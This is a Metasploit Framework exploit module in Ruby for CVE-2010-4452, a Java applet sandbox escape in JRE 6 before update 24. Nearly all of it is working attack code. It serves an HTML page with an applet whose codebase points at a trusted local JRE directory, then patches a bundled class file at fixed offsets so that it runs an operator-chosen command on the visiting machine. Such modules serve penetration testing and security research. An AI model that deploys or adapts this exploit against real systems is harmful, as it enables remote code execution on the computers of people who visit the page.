##
# $Id: java_codebase_trust.rb 11983 2011-03-16 05:01:29Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize( info = {} )
		super( update_info( info,
			'Name'          => 'Sun Java Applet2ClassLoader Remote Code Execution Exploit',
			'Description'   => %q{
					This module exploits a vulnerability in Java Runtime Environment
				that allows an attacker to escape the Java Sandbox. By supplying a 
				codebase that points at a trusted directory and a code that is a URL that
				does not contain an dots an applet can run without the sandbox.

				The vulnerability affects version 6 prior to update 24.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [
					'Frederic Hoguin', # Discovery, PoC
					'jduck'            # Metasploit module
				],
			'Version'       => '$Revision: 11983 $',
			'References'    =>
				[
					[ 'CVE', '2010-4452' ],
					# [ 'OSVDB', '' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-084/' ],
					[ 'URL', 'http://fhoguin.com/2011/03/oracle-java-unsigned-applet-applet2classloader-remote-code-execution-vulnerability-zdi-11-084-explained/' ],
					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpufeb2011-304611.html' ]
				],
			'Platform'      => [ 'java', 'win' ],
			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'       =>
				[
					# OK on Windows x86 + IE + Sun Java 1.6.0u21,u22,u23
					# FAIL on Ubuntu x86 + Firefox + Sun Java 1.6.0u23
					[ 'Automatic (no payload)', { } ]
=begin
					[ 'Windows x86',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win',
						}
					],
					[ 'Generic (Java Payload)',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java',
						}
					],
=end
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 15 2011'
			))
	
		register_options(
			[
				OptString.new('CMD', [ false,  "Command to run.", "calc.exe"]),
				OptString.new('LIBPATH', [ false,  "The codebase path to use (privileged)",
					"C:\\Program Files\\java\\jre6\\lib\\ext"]),
			], self.class)
	end

	def exploit
		path = [ Msf::Config.data_directory, "exploits", "cve-2010-4452", "AppletX.class" ].join(::File::SEPARATOR)
		@java_class = nil
		File.open(path, "rb") { |fd|
			@java_class = fd.read(fd.stat.size)
		}
		if not @java_class
			raise RuntimeError, "Unable to load java class"
		end

		super
	end

	def on_request_uri(cli, request)
		#print_status("Received request: #{request.uri}")

		jpath = get_uri(cli)
		#print_status(jpath)

		# Do what get_uri does so that we can replace it in the string
		host = Rex::Socket.source_address(cli.peerhost)
		host_num = Rex::Socket.addr_aton(host).unpack('N').first

		codebase = "file:" + datastore['LIBPATH']
		code_url = jpath.sub(host, host_num.to_s)

		cmd = datastore['CMD']
		cmd_off = 0xb4

		cn_off = 0xfc

		case request.uri

		when /\.class$/
			#p = regenerate_payload(cli)

			print_status("Sending class file to #{cli.peerhost}:#{cli.peerport}...")

			cls = @java_class.dup
			cls[cmd_off,2] = [cmd.length].pack('n')
			cls[cmd_off+2,8] = cmd

			cn_off += (cmd.length - 8)  # the original length was 8 (calc.exe)
			cls[cn_off,2] = [code_url.length].pack('n')
			cls[cn_off+2,7] = code_url

			#File.open('ughz.class', 'wb') { |fd| fd.write cls }

			send_response(cli, cls, { 'Content-Type' => "application/octet-stream" })
			handler(cli)

		else
			html = <<-EOS
<html>
<body>
<applet codebase="#{codebase}" code="#{code_url}" />
</body>
</html>
EOS
			print_status("Sending HTML file to #{cli.peerhost}:#{cli.peerport}...")
			send_response_html(cli, html)
			handler(cli)
		end

	end

end
